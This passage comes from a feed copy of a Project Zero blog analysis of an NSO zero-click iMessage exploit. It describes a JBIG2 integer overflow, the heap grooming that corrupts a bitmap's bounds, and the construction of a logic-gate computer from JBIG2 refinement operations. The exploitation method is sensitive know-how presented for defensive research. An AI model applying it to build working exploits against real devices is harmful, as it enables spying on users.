&lt;p class="c3"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; if ((seg = findSegment(refSegs[i]))) {&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; if (seg-&amp;gt;getType() == jbig2SegSymbolDict) {&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; symbolDict = (JBIG2SymbolDict *)seg;&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; for (k = 0; k &amp;lt; symbolDict-&amp;gt;getSize(); ++k) {&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c6"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c0 c18"&gt;syms[kk++] = symbolDict-&amp;gt;getBitmap(k); // (4)&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; }&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; }&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; }&lt;/span&gt;&lt;/p&gt; &lt;p class="c21"&gt;&lt;span class="c6"&gt;&amp;nbsp; }&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt; &lt;p class="c3 c10"&gt;&lt;span class="c5"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c6"&gt;numSyms&lt;/span&gt;&lt;span&gt;&amp;nbsp;is a 32-bit integer declared at &lt;/span&gt;&lt;span class="c6"&gt;(1)&lt;/span&gt;&lt;span&gt;. By supplying carefully crafted &lt;/span&gt;&lt;span&gt;reference segments&lt;/span&gt;&lt;span&gt;&amp;nbsp;it&amp;#39;s possible for the repeated addition at &lt;/span&gt;&lt;span class="c6"&gt;(2)&lt;/span&gt;&lt;span&gt;&amp;nbsp;to cause &lt;/span&gt;&lt;span class="c6"&gt;numSyms&lt;/span&gt;&lt;span class="c5"&gt;&amp;nbsp;to overflow to a controlled, small value.&lt;/span&gt;&lt;/p&gt; &lt;p class="c3 c10"&gt;&lt;span class="c5"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span&gt;That smaller value is used for the heap allocation size at &lt;/span&gt;&lt;span class="c6"&gt;(3)&lt;/span&gt;&lt;span&gt;&amp;nbsp;meaning &lt;/span&gt;&lt;span class="c6"&gt;syms&lt;/span&gt;&lt;span class="c5"&gt;&amp;nbsp;points to an undersized buffer.&lt;/span&gt;&lt;/p&gt; &lt;p class="c3 c10"&gt;&lt;span class="c5"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span&gt;Inside the inner-most loop at &lt;/span&gt;&lt;span class="c6"&gt;(4)&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c6"&gt;JBIG2Bitmap&lt;/span&gt;&lt;span&gt;&amp;nbsp;pointer values are written into the undersized &lt;/span&gt;&lt;span class="c6"&gt;syms&lt;/span&gt;&lt;span class="c5"&gt;&amp;nbsp;buffer.&lt;/span&gt;&lt;/p&gt; &lt;p class="c3 c10"&gt;&lt;span class="c5"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span&gt;Without another trick this loop would write over 32GB of data into the undersized &lt;/span&gt;&lt;span class="c6"&gt;syms&lt;/span&gt;&lt;span&gt;&amp;nbsp;buffer, certainly causing a crash. To avoid that crash the heap is groomed such that the first few writes off of the end of the &lt;/span&gt;&lt;span class="c6"&gt;syms&lt;/span&gt;&lt;span&gt;&amp;nbsp;buffer corrupt the &lt;/span&gt;&lt;span class="c6"&gt;GList&lt;/span&gt;&lt;span&gt;&amp;nbsp;backing buffer. This &lt;/span&gt;&lt;span class="c6"&gt;GList&lt;/span&gt;&lt;span&gt;&amp;nbsp;stores all known segments and is used by the &lt;/span&gt;&lt;span class="c6"&gt;findSegments&lt;/span&gt;&lt;span&gt;&amp;nbsp;routine to map from the segment numbers passed in &lt;/span&gt;&lt;span class="c6"&gt;refSegs&lt;/span&gt;&lt;span&gt;&amp;nbsp;to &lt;/span&gt;&lt;span class="c6"&gt;JBIG2Segment&lt;/span&gt;&lt;span&gt;&amp;nbsp;pointers. The overflow causes the JBIG2Segment pointers in the GList to be overwritten with &lt;/span&gt;&lt;span class="c6"&gt;JBIG2Bitmap&lt;/span&gt;&lt;span&gt;&amp;nbsp;pointers at &lt;/span&gt;&lt;span class="c6"&gt;(4)&lt;/span&gt;&lt;span class="c5"&gt;.&lt;/span&gt;&lt;/p&gt; &lt;p class="c3 c10"&gt;&lt;span class="c5"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span&gt;Conveniently since &lt;/span&gt;&lt;span class="c6"&gt;JBIG2Bitmap&lt;/span&gt;&lt;span&gt;&amp;nbsp;inherits from &lt;/span&gt;&lt;span class="c6"&gt;JBIG2Segment&lt;/span&gt;&lt;span&gt;&amp;nbsp;the &lt;/span&gt;&lt;span class="c6"&gt;seg-&amp;gt;getType()&lt;/span&gt;&lt;span&gt;&amp;nbsp;virtual call succeed even on devices where Pointer Authentication is enabled (which is used to perform a weak type check on virtual calls) but the returned type will now &lt;/span&gt;&lt;span class="c8"&gt;not&lt;/span&gt;&lt;span&gt;&amp;nbsp;be equal to &lt;/span&gt;&lt;span class="c6"&gt;jbig2SegSymbolDict&lt;/span&gt;&lt;span&gt;&amp;nbsp;thus causing further writes at &lt;/span&gt;&lt;span class="c6"&gt;(4)&lt;/span&gt;&lt;span&gt;&amp;nbsp;to not be reached and bounding the extent of the memory corruption&lt;/span&gt;&lt;span&gt;.&lt;/span&gt;&lt;/p&gt; &lt;p class="c3 c10"&gt;&lt;span class="c5"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c5"&gt;&lt;a href="https://blogger.googleusercontent.com/img/a/AVvXsEh3sDkZw8L9bJowGRjXcR-k0Qqwi_CaHYh7HxeTySEvC7PgxPJ1HUdjkvOaAqN_knp5kWl710qlryXstIc9c5eHqUMNP2DcCBqLkV_vHHsxbYb34TlIHmn7rrG-PQTQMlqPhRrO3M65lJoWsQyLpeGiW6QeFKkKc_ZJvw-eTvWwGUziGjd-MYH9kYmE4g=s506" style="display: block; padding: 1em 0;text-align: center;"&gt;&lt;img src="https://blogger.googleusercontent.com/img/a/AVvXsEh3sDkZw8L9bJowGRjXcR-k0Qqwi_CaHYh7HxeTySEvC7PgxPJ1HUdjkvOaAqN_knp5kWl710qlryXstIc9c5eHqUMNP2DcCBqLkV_vHHsxbYb34TlIHmn7rrG-PQTQMlqPhRrO3M65lJoWsQyLpeGiW6QeFKkKc_ZJvw-eTvWwGUziGjd-MYH9kYmE4g=s506" border="0" alt="" style="max-height: 750px; max-width: 600px;" /&gt;&lt;/a&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c12"&gt;&lt;span class="c9 c7"&gt;A simplified view of the memory layout when the heap overflow occurs showing the undersized-buffer below the GList backing buffer and the JBIG2Bitmap&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c9 c7"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c8 c14"&gt;Boundless unbounding&lt;/span&gt;&lt;/p&gt; &lt;p class="c3 c10"&gt;&lt;span class="c5"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span&gt;Directly after the corrupted segments &lt;/span&gt;&lt;span class="c6"&gt;GList&lt;/span&gt;&lt;span&gt;, the attacker grooms the &lt;/span&gt;&lt;span class="c6"&gt;JBIG2Bitmap&lt;/span&gt;&lt;span class="c5"&gt;&amp;nbsp;object which represents the current page (the place to where current drawing commands render). &lt;/span&gt;&lt;/p&gt; &lt;p class="c3 c10"&gt;&lt;span class="c5"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c6"&gt;JBIG2Bitmaps&lt;/span&gt;&lt;span class="c5"&gt;&amp;nbsp;are simple wrappers around a backing buffer, storing the buffer&amp;rsquo;s width and height (in bits) as well as a line value which defines how many bytes are stored for each line.&lt;/span&gt;&lt;/p&gt; &lt;p class="c3 c10"&gt;&lt;span class="c5"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c5"&gt;&lt;a href="https://blogger.googleusercontent.com/img/a/AVvXsEjHv6_8ljNUlXsWATAbHBQPMakyH1pc3E3izqeWUjKkBnnsitW5qfX01VHl_N0sjLNgvEY0TK2H042i8L5CFybmzGlaIxiBxRH6MF4oF0jdh-cSgqan7hc5Tvq3aGgSu2m5YhFs3CG9R9vssV8weFDW5clYy38wDo7xGzrbyhVdRJ9iUPDhP0JctCLbGg=s1070" style="display: block; padding: 1em 0;text-align: center;"&gt;&lt;img src="https://blogger.googleusercontent.com/img/a/AVvXsEjHv6_8ljNUlXsWATAbHBQPMakyH1pc3E3izqeWUjKkBnnsitW5qfX01VHl_N0sjLNgvEY0TK2H042i8L5CFybmzGlaIxiBxRH6MF4oF0jdh-cSgqan7hc5Tvq3aGgSu2m5YhFs3CG9R9vssV8weFDW5clYy38wDo7xGzrbyhVdRJ9iUPDhP0JctCLbGg=s1070" border="0" alt="" style="max-height: 750px; max-width: 600px;" /&gt;&lt;/a&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c12"&gt;&lt;span class="c9 c7"&gt;The memory layout of the JBIG2Bitmap object showing the segnum, w, h and line fields which are corrupted during the overflow&lt;/span&gt;&lt;/p&gt; &lt;p class="c3 c10"&gt;&lt;span class="c5"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span&gt;By carefully structuring &lt;/span&gt;&lt;span class="c6"&gt;refSegs&lt;/span&gt;&lt;span&gt;&amp;nbsp;they can stop the overflow after writing exactly three more &lt;/span&gt;&lt;span class="c6"&gt;JBIG2Bitmap&lt;/span&gt;&lt;span&gt;&amp;nbsp;pointers after the end of the &lt;/span&gt;&lt;span class="c6"&gt;segments&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c6"&gt;GList&lt;/span&gt;&lt;span&gt;&amp;nbsp;buffer. This overwrites the vtable pointer and the first four fields of the &lt;/span&gt;&lt;span class="c6"&gt;JBIG2Bitmap&lt;/span&gt;&lt;span&gt;&amp;nbsp;representing the current page.&lt;/span&gt;&lt;span&gt;&amp;nbsp;Due to the nature of the iOS address space layout these pointers are very likely to be in the second 4GB of virtual memory, with addresses between &lt;/span&gt;&lt;span class="c6"&gt;0x100000000&lt;/span&gt;&lt;span&gt;&amp;nbsp;and &lt;/span&gt;&lt;span class="c6"&gt;0x1ffffffff&lt;/span&gt;&lt;span&gt;. Since all iOS hardware is little endian (meaning that the &lt;/span&gt;&lt;span class="c6"&gt;w&lt;/span&gt;&lt;span&gt;&amp;nbsp;and &lt;/span&gt;&lt;span class="c6"&gt;line&lt;/span&gt;&lt;span&gt;&amp;nbsp;fields are likely to be overwritten with &lt;/span&gt;&lt;span class="c6"&gt;0x1&lt;/span&gt;&lt;span&gt;&amp;nbsp;&amp;mdash; &lt;/span&gt;&lt;span&gt;the most-significant half of a &lt;/span&gt;&lt;span class="c6"&gt;JBIG2Bitmap&lt;/span&gt;&lt;span&gt;&amp;nbsp;pointer) and the &lt;/span&gt;&lt;span class="c6"&gt;segNum&lt;/span&gt;&lt;span&gt;&amp;nbsp;and &lt;/span&gt;&lt;span class="c6"&gt;h&lt;/span&gt;&lt;span&gt;&amp;nbsp;fields are likely to be overwritten with the least-significant half of such a pointer, a fairly random value depending on heap layout and ASLR somewhere between &lt;/span&gt;&lt;span class="c6"&gt;0x100000&lt;/span&gt;&lt;span&gt;&amp;nbsp;and &lt;/span&gt;&lt;span class="c6"&gt;0xffffffff&lt;/span&gt;&lt;span class="c5"&gt;.&lt;/span&gt;&lt;/p&gt; &lt;p class="c3 c10"&gt;&lt;span class="c5"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span&gt;This gives the current destination page &lt;/span&gt;&lt;span class="c6"&gt;JBIG2Bitmap&lt;/span&gt;&lt;span&gt;&amp;nbsp;an unknown, but very large, value for &lt;/span&gt;&lt;span class="c6"&gt;h&lt;/span&gt;&lt;span&gt;. Since that &lt;/span&gt;&lt;span class="c6"&gt;h&lt;/span&gt;&lt;span&gt;&amp;nbsp;value is used for bounds checking and is supposed to reflect the allocated size of the page backing buffer, this has the effect of &amp;quot;unbounding&amp;quot; the drawing canvas. This means that subsequent &lt;/span&gt;&lt;span class="c6"&gt;JBIG2&lt;/span&gt;&lt;span class="c5"&gt;&amp;nbsp;segment commands can read and write memory outside of the original bounds of the page backing buffer.&lt;/span&gt;&lt;/p&gt; &lt;p class="c3 c10"&gt;&lt;span class="c5"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span&gt;The heap groom also places the current page&amp;#39;s backing buffer just below the undersized &lt;/span&gt;&lt;span class="c6"&gt;syms&lt;/span&gt;&lt;span&gt;&amp;nbsp;buffer, such that when the page &lt;/span&gt;&lt;span class="c6"&gt;JBIG2Bitmap&lt;/span&gt;&lt;span&gt;&amp;nbsp;is unbounded, it&amp;#39;s able to &lt;/span&gt;&lt;span&gt;read and write&lt;/span&gt;&lt;span class="c5"&gt;&amp;nbsp;its own fields:&lt;/span&gt;&lt;/p&gt; &lt;p class="c3 c10"&gt;&lt;span class="c5"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;hr style="page-break-before:always;display:none;"&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c5"&gt;&lt;a href="https://blogger.googleusercontent.com/img/a/AVvXsEgkSlYnjoMsv5mHOKQARzrvGqPICZEqlS44yIYwnGbExdo9turfzNJLB0SKtg5DOYzg5JhcKkZj-5vMaq0uTI-A2MGsmBOMmCVl41SV7VChMmE2aBuK2FwxouyWBVbpQyCM4Jdark7gyKaUt9ZGdMIZGDL5ZLtnPt9BQgXyeEACXz22zH_phdfGftX5mA=s550" style="display: block; padding: 1em 0;text-align: center;"&gt;&lt;img src="https://blogger.googleusercontent.com/img/a/AVvXsEgkSlYnjoMsv5mHOKQARzrvGqPICZEqlS44yIYwnGbExdo9turfzNJLB0SKtg5DOYzg5JhcKkZj-5vMaq0uTI-A2MGsmBOMmCVl41SV7VChMmE2aBuK2FwxouyWBVbpQyCM4Jdark7gyKaUt9ZGdMIZGDL5ZLtnPt9BQgXyeEACXz22zH_phdfGftX5mA=s550" border="0" alt="" style="max-height: 750px; max-width: 600px;" /&gt;&lt;/a&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c12"&gt;&lt;span class="c9 c7"&gt;The memory layout showing how the unbounded bitmap backing buffer is able to reference the JBIG2Bitmap object and modify fields in it as it is located after the backing buffer in memory&lt;/span&gt;&lt;/p&gt; &lt;p class="c3 c10"&gt;&lt;span class="c5"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span&gt;By rendering 4-byte bitmaps at the correct canvas coordinates they can write to all the fields of the page &lt;/span&gt;&lt;span class="c6"&gt;JBIG2Bitmap&lt;/span&gt;&lt;span&gt;&amp;nbsp;and b&lt;/span&gt;&lt;span&gt;y carefully choosing new values for &lt;/span&gt;&lt;span class="c6"&gt;w&lt;/span&gt;&lt;span&gt;, &lt;/span&gt;&lt;span class="c6"&gt;h&lt;/span&gt;&lt;span&gt;&amp;nbsp;and &lt;/span&gt;&lt;span class="c6"&gt;line&lt;/span&gt;&lt;span&gt;, &lt;/span&gt;&lt;span class="c5"&gt;they can write to arbitrary offsets from the page backing buffer.&lt;/span&gt;&lt;/p&gt; &lt;p class="c3 c10"&gt;&lt;span class="c5"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c5"&gt;At this point it would also be possible to write to arbitrary absolute memory addresses if you knew their offsets from the page backing buffer. But how to compute those offsets? Thus far, this exploit has proceeded in a manner very similar to a &amp;quot;canonical&amp;quot; scripting language exploit which in Javascript might end up with an unbounded ArrayBuffer object with access to memory. But in those cases the attacker has the ability to run arbitrary Javascript which can obviously be used to compute offsets and perform arbitrary computations. How do you do that in a single-pass image parser?&lt;/span&gt;&lt;/p&gt; &lt;p class="c3 c10"&gt;&lt;span class="c5"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c14 c8"&gt;My other compression format is turing-complete!&lt;/span&gt;&lt;/p&gt; &lt;p class="c3 c10"&gt;&lt;span class="c14 c8"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c5"&gt;As mentioned earlier, the sequence of steps which implement JBIG2 refinement are very flexible. Refinement steps can reference both the output bitmap and any previously created segments, as well as render output to either the current page or a segment. By carefully crafting the context-dependent part of the refinement decompression, it&amp;#39;s possible to craft sequences of segments where only the refinement combination operators have any effect.&lt;/span&gt;&lt;/p&gt; &lt;p class="c3 c10"&gt;&lt;span class="c5"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span&gt;In practice this means it is possible to apply the AND, OR, XOR and XNOR logical operators between memory regions at arbitrary offsets from the current page&amp;#39;s &lt;/span&gt;&lt;span class="c6"&gt;JBIG2Bitmap&lt;/span&gt;&lt;span class="c5"&gt;&amp;nbsp;backing buffer. And since that has been unbounded&amp;hellip; it&amp;#39;s possible to perform those logical operations on memory at arbitrary out-of-bounds offsets:&lt;/span&gt;&lt;/p&gt; &lt;p class="c3 c10"&gt;&lt;span class="c5"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c5"&gt;&lt;a href="https://blogger.googleusercontent.com/img/a/AVvXsEiJHLjuE1TzkQPJYrSalZ3JL9ZlBfrdmXl_P77-Iq4I3ZEYJ5Onv8c422-wUKSjOE8svNKjZSTAnj0iKgDoCBc-7WPy7nSyjvNyhk8268eX_WebfTesgjMlhCMzGA7ivBESmxpogH0mD6B03xB8rhQ6oe0dOTNKVuXm4HTDk5rlF28KRH1Q81PshK8eDg=s551" style="display: block; padding: 1em 0;text-align: center;"&gt;&lt;img src="https://blogger.googleusercontent.com/img/a/AVvXsEiJHLjuE1TzkQPJYrSalZ3JL9ZlBfrdmXl_P77-Iq4I3ZEYJ5Onv8c422-wUKSjOE8svNKjZSTAnj0iKgDoCBc-7WPy7nSyjvNyhk8268eX_WebfTesgjMlhCMzGA7ivBESmxpogH0mD6B03xB8rhQ6oe0dOTNKVuXm4HTDk5rlF28KRH1Q81PshK8eDg=s551" border="0" alt="" style="max-height: 750px; max-width: 600px;" /&gt;&lt;/a&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c12"&gt;&lt;span class="c9 c7"&gt;The memory layout showing how logical operators can be applied out-of-bounds&lt;/span&gt;&lt;/p&gt; &lt;p class="c3 c10"&gt;&lt;span class="c5"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c5"&gt;It&amp;#39;s when you take this to its most extreme form that things start to get really interesting. What if rather than operating on glyph-sized sub-rectangles you instead operated on single bits?&lt;/span&gt;&lt;/p&gt; &lt;p class="c3 c10"&gt;&lt;span class="c5"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c8"&gt;You can now provide as input a sequence of JBIG2 segment commands which implement a sequence of logical bit operations to apply to the page. And since the page buffer has been unbounded those bit operations can operate on arbitrary memory.&lt;/span&gt;&lt;/p&gt; &lt;p class="c3 c10"&gt;&lt;span class="c5"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span&gt;With a bit of back-of-the-envelope scribbling you can convince yourself that with just the available AND, OR, XOR and XNOR logical&lt;/span&gt;&lt;span&gt;&amp;nbsp;operators&lt;/span&gt;&lt;span&gt;&amp;nbsp;you can in fact compute &lt;/span&gt;&lt;span class="c7"&gt;any&lt;/span&gt;&lt;span class="c5"&gt;&amp;nbsp;computable function - the simplest proof being that you can create a logical NOT operator by XORing with 1 and then putting an AND gate in front of that to form a NAND gate:&lt;/span&gt;&lt;/p&gt; &lt;p class="c3 c10"&gt;&lt;span class="c5"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c5"&gt;&lt;a href="https://blogger.googleusercontent.com/img/a/AVvXsEgU2PbU_PLrLOH1W-ZuOIC0aR5iOEt3iJonIHUpsf4PxyWoyfGF3xoOMaMUtpgvGNWenhWFe4ER31RQuB4_ikNt6qnYpYmmigtRziR192B3G-qHOqza5Wjm0DnkOk9a4TJLRBegZvk8E1nSJuDelFRHrzgGEq2p_6wIts5zeBXzzuqVU8p0qlK--cscGw=s265" style="display: block; padding: 1em 0;text-align: center;"&gt;&lt;img src="https://blogger.googleusercontent.com/img/a/AVvXsEgU2PbU_PLrLOH1W-ZuOIC0aR5iOEt3iJonIHUpsf4PxyWoyfGF3xoOMaMUtpgvGNWenhWFe4ER31RQuB4_ikNt6qnYpYmmigtRziR192B3G-qHOqza5Wjm0DnkOk9a4TJLRBegZvk8E1nSJuDelFRHrzgGEq2p_6wIts5zeBXzzuqVU8p0qlK--cscGw=s265" border="0" alt="" style="max-height: 750px; max-width: 600px;" /&gt;&lt;/a&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c12"&gt;&lt;span class="c9 c7"&gt;An AND gate connected to one input of an XOR gate. The other XOR gate input is connected to the constant value 1 creating an NAND.&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c9 c7"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span&gt;A NAND gate is an example of a universal logic gate; one from which all other gates can be built and from which a circuit can be &lt;/span&gt;&lt;span class="c16"&gt;&lt;a class="c21" href="https://www.nand2tetris.org/"&gt;built to compute any computable function&lt;/a&gt;&lt;/span&gt;&lt;span class="c5"&gt;.&lt;/span&gt;&lt;/p&gt; &lt;p class="c3 c10"&gt;&lt;span class="c5"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c14 c8"&gt;Practical circuits&lt;/span&gt;&lt;/p&gt; &lt;p class="c3 c10"&gt;&lt;span class="c5"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span&gt;JBIG2 doesn&amp;#39;t have scripting capabilities, but when combined with a vulnerability, it does have the ability to emulate circuits of arbitrary logic gates operating on arbitrary memory. So why not just use that to build your &lt;/span&gt;&lt;span class="c7"&gt;own&lt;/span&gt;&lt;span&gt;&amp;nbsp;computer architecture and script that!? That&amp;#39;s exactly what this exploit does. Using over 70,000 segment commands defining logical bit operations, they define a small computer architecture with features such as registers and a full 64-bit adder and comparator which they use to search memory and perform arithmetic operations. It&amp;#39;s not as fast as Javascript, but it&amp;#39;s fundamentally computationally equivalent&lt;/span&gt;&lt;span&gt;.&lt;/span&gt;&lt;/p&gt; &lt;p class="c3 c10"&gt;&lt;span class="c5"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c5"&gt;The bootstrapping operations for the sandbox escape exploit are written to run on this logic circuit and the whole thing runs in this weird, emulated environment created out of a single decompression pass through a JBIG2 stream. It&amp;#39;s pretty incredible, and at the same time, pretty terrifying.&lt;/span&gt;&lt;/p&gt; &lt;p class="c3 c10"&gt;&lt;span class="c5"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span&gt;In a future post (currently being finished),&lt;/span&gt;&lt;span&gt;&amp;nbsp;we&amp;#39;ll take a look at exactly how they escape the &lt;/span&gt;&lt;span class="c6"&gt;IMTranscoderAgent&lt;/span&gt;&lt;span&gt;&amp;nbsp;sandbox.&lt;/span&gt;&lt;/p&gt;</content>
    <link rel="replies" type="application/atom+xml" href="https://googleprojectzero.blogspot.com/feeds/5073082417618502919/comments/default" title="Post Comments" />
    <link rel="replies" type="text/html" href="https://googleprojectzero.blogspot.com/2021/12/a-deep-dive-into-nso-zero-click.html#comment-form" title="0 Comments" />
    <link rel="edit" type="application/atom+xml" href="https://www.blogger.com/feeds/4838136820032157985/posts/default/5073082417618502919" />
    <link rel="self" type="application/atom+xml" href="https://www.blogger.com/feeds/4838136820032157985/posts/default/5073082417618502919" />
    <link rel="alternate" type="text/html" href="https://googleprojectzero.blogspot.com/2021/12/a-deep-dive-into-nso-zero-click.html" title="A deep dive into an NSO zero-click iMessage exploit: Remote Code Execution" />
    <author>
      <name>Ryan</name>
      <uri>http://www.blogger.com/profile/17011901605865574886</uri>
      <email>noreply@blogger.com</email>
      <gd:image rel="http://schemas.google.com/g/2005#thumbnail" width="16" height="16" src="https://img1.blogblog.com/img/b16-rounded.gif" />
    </author>
    <media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="https://blogger.googleusercontent.com/img/a/AVvXsEgzqxpl0250IinIsgxGQRKF09QzU4pN0h8WvRtZQYaHjJmJ1MrGLh1wnEbaPBhSYHLgWezIfk6MOaGphBO3PRGX432k2dxcknktEErH4fW50f8MFzbqlMG-JdpGcSJw8NjMmTTAgKkBuCHku2Y06rQOS2mRI8voqyzI51OVlbBWA7CwtdFj4Sd50cMo7A=s72-c" height="72" width="72" />
    <thr:total>0</thr:total>
  </entry>
  <entry>
    <id>tag:blogger.com,1999:blog-4838136820032157985.post-7868790017880077590</id>
    <published>2021-12-01T10:38:00.002-08:00</published>
    <updated>2021-12-01T14:27:11.840-08:00</updated>
    <title type="text">This shouldn't have happened: A vulnerability postmortem</title>
    <content type="html">&lt;style type="text/css"&gt;@import url('https://themes.googleusercontent.com/fonts/css?kit=t66UaDGGO9uRFa9A_n0Ge4kPz49mG1-u2NJpkhDAP5E');.lst-kix_q4elz23jmthh-5&gt;li{counter-increment:lst-ctn-kix_q4elz23jmthh-5}ol.lst-kix_q4elz23jmthh-6.start{counter-reset:lst-ctn-kix_q4elz23jmthh-6 0}ul.lst-kix_wy7koemfbmv1-3{list-style-type:none}ul.lst-kix_wy7koemfbmv1-2{list-style-type:none}ul.lst-kix_wy7koemfbmv1-5{list-style-type:none}.lst-kix_2hgb22nra90i-8&gt;li:before{content:"\0025a0  "}ul.lst-kix_wy7koemfbmv1-4{list-style-type:none}ul.lst-kix_wy7koemfbmv1-1{list-style-type:none}.lst-kix_2hgb22nra90i-7&gt;li:before{content:"\0025cb  "}ul.lst-kix_wy7koemfbmv1-0{list-style-type:none}ol.lst-kix_q4elz23jmthh-0.start{counter-reset:lst-ctn-kix_q4elz23jmthh-0 0}.lst-kix_2hgb22nra90i-4&gt;li:before{content:"\0025cb  "}.lst-kix_2hgb22nra90i-6&gt;li:before{content:"\0025cf  "}.lst-kix_2hgb22nra90i-5&gt;li:before{content:"\0025a0  "}ul.lst-kix_z8xtsan2wa5s-5{list-style-type:none}ul.lst-kix_z8xtsan2wa5s-6{list-style-type:none}.lst-kix_q4elz23jmthh-7&gt;li{counter-increment:lst-ctn-kix_q4elz23jmthh-7}ul.lst-kix_z8xtsan2wa5s-7{list-style-type:none}ul.lst-kix_z8xtsan2wa5s-8{list-style-type:none}.lst-kix_2hgb22nra90i-0&gt;li:before{content:"\0025cf  "}.lst-kix_2hgb22nra90i-2&gt;li:before{content:"\0025a0  "}.lst-kix_2hgb22nra90i-3&gt;li:before{content:"\0025cf  "}ul.lst-kix_z8xtsan2wa5s-0{list-style-type:none}ul.lst-kix_z8xtsan2wa5s-1{list-style-type:none}ul.lst-kix_wy7koemfbmv1-7{list-style-type:none}ul.lst-kix_z8xtsan2wa5s-2{list-style-type:none}ul.lst-kix_wy7koemfbmv1-6{list-style-type:none}ul.lst-kix_z8xtsan2wa5s-3{list-style-type:none}ul.lst-kix_z8xtsan2wa5s-4{list-style-type:none}.lst-kix_2hgb22nra90i-1&gt;li:before{content:"\0025cb  "}ul.lst-kix_wy7koemfbmv1-8{list-style-type:none}.lst-kix_q4elz23jmthh-5&gt;li:before{content:"" counter(lst-ctn-kix_q4elz23jmthh-5,lower-roman) ". "}.lst-kix_q4elz23jmthh-6&gt;li:before{content:"" counter(lst-ctn-kix_q4elz23jmthh-6,decimal) ". "}.lst-kix_q4elz23jmthh-4&gt;li:before{content:"" counter(lst-ctn-kix_q4elz23jmthh-4,lower-latin) ". "}.lst-kix_q4elz23jmthh-8&gt;li:before{content:"" counter(lst-ctn-kix_q4elz23jmthh-8,lower-roman) ". "}.lst-kix_oetzaqvyxxoa-0&gt;li:before{content:"\0025cf  "}.lst-kix_oetzaqvyxxoa-1&gt;li:before{content:"\0025cb  "}.lst-kix_oetzaqvyxxoa-2&gt;li:before{content:"\0025a0  "}.lst-kix_oetzaqvyxxoa-3&gt;li:before{content:"\0025cf  "}.lst-kix_q4elz23jmthh-7&gt;li:before{content:"" counter(lst-ctn-kix_q4elz23jmthh-7,lower-latin) ". "}.lst-kix_q4elz23jmthh-0&gt;li:before{content:"" counter(lst-ctn-kix_q4elz23jmthh-0,decimal) ". 